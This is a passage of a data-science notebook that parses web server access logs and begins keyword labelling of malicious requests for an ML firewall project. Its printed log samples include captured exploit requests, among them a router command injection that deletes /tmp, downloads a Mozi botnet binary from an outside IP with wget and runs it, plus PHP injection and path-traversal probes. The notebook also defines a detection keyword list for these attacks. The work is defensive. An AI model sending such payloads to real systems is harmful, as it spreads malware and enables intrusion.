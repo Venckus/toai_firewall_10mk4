{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.12-final"
    },
    "orig_nbformat": 2,
    "kernelspec": {
      "name": "python361264bitfc9e9ecad33e492fbe0dd8971c42f827",
      "display_name": "Python 3.6.12 64-bit"
    },
    "colab": {
      "name": "project.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "XoW09Z8y-UZA",
        "x2SnUWI_-UZJ",
        "Z62kILNL-UZR",
        "-Y03W9Uq-UZb"
      ]
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PCCoKRp1-UXp"
      },
      "source": [
        "# 1 Imports"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "c8swEdgi-UXr"
      },
      "source": [
        "from os import listdir\n",
        "from os.path import isfile, join\n",
        "import numpy as np\n",
        "import pandas as pd"
      ],
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1eAQx2xJbl0g"
      },
      "source": [
        "# fastai imports\n",
        "%load_ext autoreload\n",
        "%autoreload 2\n",
        "%matplotlib inline"
      ],
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "msuwNlG9cLeL"
      },
      "source": [
        "# fastai imports (not needed here?)\n",
        "# from fastai.imports import *\n",
        "# from fastai.tabular import *"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qqZM0navqdWw"
      },
      "source": [
        "from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer, TfidfTransformer\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.linear_model import LogisticRegression, SGDClassifier\n",
        "from sklearn.pipeline import Pipeline\n",
        "from sklearn.model_selection import GridSearchCV\n",
        "from sklearn import metrics"
      ],
      "execution_count": 78,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YJd5M7kljwZf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "5b45f1b7-83f7-4585-ffd0-545197f2430a"
      },
      "source": [
        "# google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Mounted at /content/drive\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lb8I7tQp-UXz"
      },
      "source": [
        "## 1.1 Read all files in `data` directory"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3SBZDEUAHeLk",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8c7f5b9d-3fd0-4d87-e50f-8dd15c0b11c0"
      },
      "source": [
        "!pwd"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/content\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9t9BQSi_i_k-",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "547d5f32-6315-4eee-bb8c-b82d770d6471"
      },
      "source": [
        "!ls 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/'"
      ],
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "2021-01-001.log  2021-01-011.log  access.log.1\t access.log.19\taccess.log.28\n",
            "2021-01-002.log  2021-01-012.log  access.log.10  access.log.2\taccess.log.29\n",
            "2021-01-003.log  2021-01-013.log  access.log.11  access.log.20\taccess.log.3\n",
            "2021-01-004.log  2021-01-014.log  access.log.12  access.log.21\taccess.log.4\n",
            "2021-01-005.log  2021-01-015.log  access.log.13  access.log.22\taccess.log.5\n",
            "2021-01-006.log  2021-01-016.log  access.log.14  access.log.23\taccess.log.6\n",
            "2021-01-007.log  2021-01-017.log  access.log.15  access.log.24\taccess.log.7\n",
            "2021-01-008.log  2021-01-018.log  access.log.16  access.log.25\taccess.log.8\n",
            "2021-01-009.log  2021-01-019.log  access.log.17  access.log.26\taccess.log.9\n",
            "2021-01-010.log  access.log\t  access.log.18  access.log.27\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Kp0zI20fkr0n",
        "outputId": "65263ddc-c206-40e3-bf6c-6fe519089ae8"
      },
      "source": [
        "!tail -10 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/access.log'"
      ],
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "103.149.192.199 - - [17/Oct/2020:06:35:02 +0200] \"GET / HTTP/1.1\" 200 396 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36\"\n",
            "213.32.122.82 - - [17/Oct/2020:06:46:43 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"\n",
            "119.159.225.189 - - [17/Oct/2020:07:14:06 +0200] \"GET /admin//config.php HTTP/1.1\" 404 232 \"-\" \"curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5\"\n",
            "91.241.19.173 - - [17/Oct/2020:07:23:15 +0200] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:22:54 +0200] \"\\x05\\x01\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:24:12 +0200] \"\\x04\\x01\\x00P\\x05\\xBC\\xD2\\xE3\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:25:25 +0200] \"GET http://5.188.210.227/echo.php HTTP/1.1\" 404 209 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "36.92.170.3 - - [17/Oct/2020:09:09:16 +0200] \"GET / HTTP/1.1\" 200 612 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"\n",
            "183.136.225.56 - - [17/Oct/2020:09:34:33 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)\"\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "ZOAQDlm_-UX0",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "2f0f3ddb-d8b7-4d2d-82b4-f7c91869f45f"
      },
      "source": [
        "# read all data files\n",
        "mypath = 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data'\n",
        "data_files = [f for f in listdir(mypath) if isfile(join(mypath, f))]\n",
        "data_files"
      ],
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['access.log.15',\n",
              " 'access.log.16',\n",
              " 'access.log.17',\n",
              " 'access.log.18',\n",
              " 'access.log.19',\n",
              " 'access.log.20',\n",
              " 'access.log.21',\n",
              " 'access.log.22',\n",
              " 'access.log.23',\n",
              " 'access.log.24',\n",
              " 'access.log.25',\n",
              " 'access.log.26',\n",
              " 'access.log.28',\n",
              " 'access.log.27',\n",
              " 'access.log.29',\n",
              " 'access.log.14',\n",
              " 'access.log.13',\n",
              " 'access.log.12',\n",
              " 'access.log.11',\n",
              " 'access.log.10',\n",
              " 'access.log.9',\n",
              " 'access.log.8',\n",
              " 'access.log.1',\n",
              " 'access.log',\n",
              " 'access.log.2',\n",
              " 'access.log.3',\n",
              " 'access.log.4',\n",
              " 'access.log.5',\n",
              " 'access.log.6',\n",
              " 'access.log.7',\n",
              " '2021-01-015.log',\n",
              " '2021-01-014.log',\n",
              " '2021-01-013.log',\n",
              " '2021-01-012.log',\n",
              " '2021-01-011.log',\n",
              " '2021-01-010.log',\n",
              " '2021-01-009.log',\n",
              " '2021-01-008.log',\n",
              " '2021-01-007.log',\n",
              " '2021-01-006.log',\n",
              " '2021-01-005.log',\n",
              " '2021-01-004.log',\n",
              " '2021-01-003.log',\n",
              " '2021-01-002.log',\n",
              " '2021-01-001.log',\n",
              " '2021-01-019.log',\n",
              " '2021-01-018.log',\n",
              " '2021-01-017.log',\n",
              " '2021-01-016.log']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 8
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WQ43-a1g-UX5"
      },
      "source": [
        "## 1.2 Add all files data into one Pandas dataframe"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "rxLCCGoN-UX6",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "2cabc4bc-d923-4b24-d2f5-4a51fc7bd9be"
      },
      "source": [
        "%%time\n",
        "li = []\n",
        "for file in data_files:\n",
        "    tmp = pd.read_csv(f'{mypath}/{file}', sep='\\s+', header=None)\n",
        "    li.append(tmp)\n",
        "df = pd.concat(li, axis=0, ignore_index=True)"
      ],
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 212 ms, sys: 22.1 ms, total: 234 ms\n",
            "Wall time: 14.9 s\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7yDRZZCP-UX_"
      },
      "source": [
        "# 2 Explore and prepare data"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZxH-B_0y-UYA",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 209
        },
        "outputId": "9919a244-8448-4a65-8afc-c26711007567"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>0</th>\n",
              "      <th>1</th>\n",
              "      <th>2</th>\n",
              "      <th>3</th>\n",
              "      <th>4</th>\n",
              "      <th>5</th>\n",
              "      <th>6</th>\n",
              "      <th>7</th>\n",
              "      <th>8</th>\n",
              "      <th>9</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:26:07</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:27:21</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:04:18</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:07:45</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:19:34</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 0  1  ...  8                                                  9\n",
              "0    66.240.205.34  -  ...  -                                                  -\n",
              "1  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  -  ...  -                                                  -\n",
              "3  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 10 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 10
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-1QjJUmz-UYF",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "4eb2cf8e-fe75-4dc8-cdca-b4178fbd8a8a"
      },
      "source": [
        "df.shape"
      ],
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(9431, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 11
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CefCW2za-UYL"
      },
      "source": [
        "## 2.1 Remove columns holding useless data '-' and rows with request = nan"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3RUCHZqe-UYN",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "fd989b45-2040-452f-c759-05e88f904772"
      },
      "source": [
        "df[1].describe()"
      ],
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "count     9431\n",
              "unique       1\n",
              "top          -\n",
              "freq      9431\n",
              "Name: 1, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 12
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QKuEsTuh-UYT"
      },
      "source": [
        "rm_colls =[1,2,4,8]\n",
        "df.drop(df.columns[rm_colls], axis=1, inplace=True)"
      ],
      "execution_count": 13,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UFLObtJj-UYY"
      },
      "source": [
        "Give names to columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RzBMWccR-UYZ"
      },
      "source": [
        "columns = {0:'IP',3:'date',5:'request',6:'code',7:'body_bytes',9:'agent'}\n",
        "df.rename(columns=columns,inplace=True)"
      ],
      "execution_count": 14,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7rbeBAN84Vfy"
      },
      "source": [
        "remove rows with `request` = nan"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LhWROxZy4UxA"
      },
      "source": [
        "df = df[df['request'].notna()]"
      ],
      "execution_count": 15,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "a7Smkfc8-UYc"
      },
      "source": [
        "remove '[' from date_time column"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QBjcnxLT-UYd"
      },
      "source": [
        "df['date'] = df['date'].str[1:]"
      ],
      "execution_count": 16,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dlGmULXO-UYi",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 209
        },
        "outputId": "667f4697-32a3-4939-f0fd-70964cc276bd"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>request</th>\n",
              "      <th>code</th>\n",
              "      <th>body_bytes</th>\n",
              "      <th>agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>26/Sep/2020:07:26:07</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                IP  ...                                              agent\n",
              "0    66.240.205.34  ...                                                  -\n",
              "1  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  ...                                                  -\n",
              "3  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 6 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 17
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QwlKCbNewHRI",
        "outputId": "efd2c8ae-0e22-452c-b8a3-527ef2ff383b"
      },
      "source": [
        "dft = df[~df['request'].str.contains(fr\"\\\\x\", regex=True)] #; dft.head()\r\n",
        "# dft[200:211]\r\n",
        "dft.shape"
      ],
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(8899, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 18
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lVzGxYQvl34e",
        "outputId": "7ebd7576-df1c-47cd-b2ba-fa017ef84f10"
      },
      "source": [
        "# check if there is even line number for 50% split\r\n",
        "if dft.shape[0] % 2 == 1:\r\n",
        "  dft = dft[:-1]\r\n",
        "dft.shape"
      ],
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(8898, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "u-GSk5xwuJkO"
      },
      "source": [
        "df[df.request.str.contains('w00t', regex=True, na=False)].values"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ySxcXftAqbka",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "6f9b7a48-8e93-42ab-b150-266e079b4b8d"
      },
      "source": [
        "# pd.set_option('display.max_columns', 200)\n",
        "# pd.set_option('large_repr','info')\n",
        "dft.request[400:500].values"
      ],
      "execution_count": 23,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['lv[endof]', 'GET /config/getuser?index=0 HTTP/1.1',\n",
              "       'GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1',\n",
              "       'GET / HTTP/1.0', 'GET / HTTP/1.1',\n",
              "       'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.97.102.104:59966/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0',\n",
              "       'POST /GponForm/diag_Form?images/ HTTP/1.1', '/tmp/gpon80&ipv=0',\n",
              "       'GET /solr/admin/info/system?wt=json HTTP/1.1', 'HEAD / HTTP/1.0',\n",
              "       'GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1',\n",
              "       'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1',\n",
              "       'GET /ReportServer HTTP/1.1', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'POST /api/jsonws/invoke HTTP/1.1', 'GET / HTTP/1.0',\n",
              "       'GET / HTTP/1.1', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET / HTTP/1.1',\n",
              "       'GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0',\n",
              "       'GET ../../proc/ HTTP', 'GET / HTTP/1.0',\n",
              "       'GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0',\n",
              "       'HEAD / HTTP/1.0', 'GET / HTTP/1.1', 'GET /wp-login.php HTTP/1.1',\n",
              "       'GET /hudson HTTP/1.1', 'GET /config/getuser?index=0 HTTP/1.1',\n",
              "       'GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'S', 'S', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1',\n",
              "       'GET / HTTP/1.0',\n",
              "       'POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /admin//config.php HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET / HTTP/1.1', 'lv[endof]',\n",
              "       'HEAD /robots.txt HTTP/1.0',\n",
              "       'GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'POST /HNAP1/ HTTP/1.0', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /.env HTTP/1.1', 'POST / HTTP/1.1',\n",
              "       'GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1',\n",
              "       'GET /solr/admin/info/system?wt=json HTTP/1.1',\n",
              "       'GET /.env HTTP/1.1', 'GET /core/.env HTTP/1.1',\n",
              "       'GET /register?%3Cplay%3Ewithme%3C/%3E HTTP/1.1',\n",
              "       'POST / HTTP/1.1', 'POST / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1',\n",
              "       'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'POST /boaform/admin/formPing HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET / HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /TP/public/index.php HTTP/1.1', 'GET /TP/index.php HTTP/1.1',\n",
              "       'GET /thinkphp/html/public/index.php HTTP/1.1',\n",
              "       'GET /html/public/index.php HTTP/1.1',\n",
              "       'GET /public/index.php HTTP/1.1',\n",
              "       'GET /TP/html/public/index.php HTTP/1.1',\n",
              "       'GET /elrekt.php HTTP/1.1', 'GET /index.php HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET ../../proc/ HTTP',\n",
              "       'GET /portal/redlion HTTP/1.1', 'POST /api/jsonws/invoke HTTP/1.1',\n",
              "       'GET /admin//config.php HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET /TP/public/index.php HTTP/1.1', 'GET / HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET http://5.188.210.227/echo.php HTTP/1.1',\n",
              "       'GET / HTTP/1.1', 'GET /admin/config.php HTTP/1.1',\n",
              "       'GET /admin/config.php HTTP/1.1', 'GET / HTTP/1.0',\n",
              "       'GET / HTTP/1.1', 'POST /boaform/admin/formLogin HTTP/1.1',\n",
              "       'GET /robots.txt HTTP/1.1', 'GET /humans.txt HTTP/1.1',\n",
              "       'GET /ads.txt HTTP/1.1'], dtype=object)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 23
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gOeUpV_RvaZ_"
      },
      "source": [
        "Potential malitious requests:\n",
        "die, md5, phpunit, .env,"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "K9YU2SnQ-UYn"
      },
      "source": [
        "# 3 Data labeling"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jsbmSidm-UYn"
      },
      "source": [
        "The source of access logs server is where the Python Flask application runs."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uIXQ4pxc-UYo"
      },
      "source": [
        "## 3.1 Functions used to filter malicious requests using keywords "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xfgmrKT1-UYp"
      },
      "source": [
        "def find_bad(tmp_df, phrase):\n",
        "    'Find rows by keyword phrase using regex'\n",
        "    new_df = tmp_df[tmp_df.requests.str.contains(phrase, regex=True, na=False)]\n",
        "    return new_df"
      ],
      "execution_count": 24,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h9znRKE7-UYs"
      },
      "source": [
        "def build_phrase(list):\n",
        "    tmp = ''\n",
        "    for word in list:\n",
        "        if tmp == '': tmp = f'{word}'\n",
        "        else: tmp = f'{tmp}|{word}'\n",
        "    return tmp"
      ],
      "execution_count": 25,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ooyyWJwK-UYw"
      },
      "source": [
        "### 3.1.1 all bad requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hChcFTtE-UYx"
      },
      "source": [
        "def get_bad_requests(tmp1_df, keywords):\n",
        "  bad_requests_phrase = build_phrase(keywords)\n",
        "  bad_requests_rows = tmp1_df[tmp1_df.request.str.contains(bad_requests_phrase, regex=True, na=False)]\n",
        "  return bad_requests_rows"
      ],
      "execution_count": 26,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cx7j1GsDzial"
      },
      "source": [
        "# \n",
        "bad_list_1 = [\n",
        "  'shell', 'die', 'md5', 'env', 'wget', 'phpunit', 'cmod', 'chown',\n",
        "  'adminisp', 'call_user_func_array', 'w00tw00t', 'ZINFO', 'script', 'example.com',\n",
        "  'getuser\\?index\\=', 'link\\?url\\='\n",
        "]"
      ],
      "execution_count": 29,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "L4qLzSaWzqI5"
      },
      "source": [
